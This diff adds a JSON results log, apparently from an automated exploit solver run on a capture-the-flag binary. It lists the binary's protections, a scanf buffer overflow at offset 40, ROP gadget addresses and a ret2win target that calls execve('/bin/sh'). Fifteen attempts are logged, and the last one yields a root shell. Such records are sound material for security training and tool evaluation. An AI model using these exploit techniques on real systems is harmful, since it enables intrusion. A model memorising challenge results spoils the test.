@@ -1,0 +1,145 @@
+{
+  "name": "ch12_zip3143",
+  "ok": true,
+  "strategy": "ret2win",
+  "detail": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=0",
+  "elapsed": 8.5,
+  "attempt_count": 15,
+  "flag_only": false,
+  "facts": {
+    "prot": {
+      "arch": "amd64/64",
+      "pie": false,
+      "canary": false,
+      "nx": true,
+      "relro": "Partial",
+      "static": false
+    },
+    "vulns": [
+      "__isoc99_scanf@0x400756 disp=-32 off=40"
+    ],
+    "wins": [
+      "shell@0x400708(execve(\"/bin/sh\"))"
+    ],
+    "binsh": "0x4007f4",
+    "gadgets": {
+      "pop_rdi": "0x4007d3",
+      "pop_rbp": "0x400628",
+      "ret": "0x400566",
+      "leave": "0x40076c"
+    },
+    "csu": true,
+    "mmap_rwx": null,
+    "fmt_buf": null,
+    "libc": null,
+    "notes": []
+  },
+  "attempts": [
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=0",
+      "ok": false,
+      "elapsed": 0.53,
+      "tail": "Welcome!May I have your name?\nOk.See you!\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=1",
+      "ok": false,
+      "elapsed": 0.54,
+      "tail": "Welcome!May I have your name?\nOk.See you!\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=0",
+      "ok": false,
+      "elapsed": 0.53,
+      "tail": "Welcome!May I have your name?\nOk.See you!\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=1",
+      "ok": false,
+      "elapsed": 0.54,
+      "tail": "Welcome!May I have your name?\nOk.See you!\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=0",
+      "ok": false,
+      "elapsed": 0.53,
+      "tail": "Welcome!May I have your name?\nOk.See you!\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=1",
+      "ok": false,
+      "elapsed": 0.53,
+      "tail": "Welcome!May I have your name?\nOk.See you!\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=0",
+      "ok": false,
+      "elapsed": 0.53,
+      "tail": "Welcome!May I have your name?\nOk.See you!\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=1",
+      "ok": false,
+      "elapsed": 0.53,
+      "tail": "Welcome!May I have your name?\nOk.See you!\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=0",
+      "ok": false,
+      "elapsed": 0.53,
+      "tail": "Welcome!May I have your name?\nOk.See you!\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=1",
+      "ok": false,
+      "elapsed": 0.53,
+      "tail": "Welcome!May I have your name?\nOk.See you!\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=0",
+      "ok": false,
+      "elapsed": 0.53,
+      "tail": "Welcome!May I have your name?\nOk.See you!\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=1",
+      "ok": false,
+      "elapsed": 0.53,
+      "tail": "Welcome!May I have your name?\nOk.See you!\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=0",
+      "ok": false,
+      "elapsed": 0.53,
+      "tail": "Welcome!May I have your name?\nOk.See you!\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=1",
+      "ok": false,
+      "elapsed": 0.53,
+      "tail": "Welcome!May I have your name?\nOk.See you!\n"
+    },
+    {
+      "strategy": "ret2win",
+      "desc": "jump to execve(\"/bin/sh\") @ 0x400708 off=40 align=0",
+      "ok": true,
+      "elapsed": 0.87,
+      "tail": "Welcome!May I have your name?\nOk.See you!\nPWNED_42\nroot\nuid=0(root) gid=0(root) groups=0(root)\n"
+    }
+  ],
+  "error": ""
+}
